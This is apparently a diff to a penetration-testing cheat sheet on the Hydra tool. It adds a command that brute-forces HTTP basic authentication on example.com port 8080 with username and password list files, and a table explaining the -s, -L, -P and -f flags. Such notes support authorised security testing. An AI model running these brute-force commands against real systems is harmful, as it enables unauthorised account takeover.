@@ -7,6 +7,21 @@ tags: ["hydra", "password", "brute force"]
 ---
 ### Hydra
 
+#### HTTP basic auth
+
+```bash
+hydra -L usernames -P passwords -s 8080 -f example.com http-get /
+```
+
+```
++-----------------------------------------+
+|-s : port                                |
+|-L : usernames file                      |
+|-P : passwords file                      |
+|-f : exit when a login/pass pair is found|
++-----------------------------------------+
+```
+
 #### Web Page Login Form
 
 ```bash
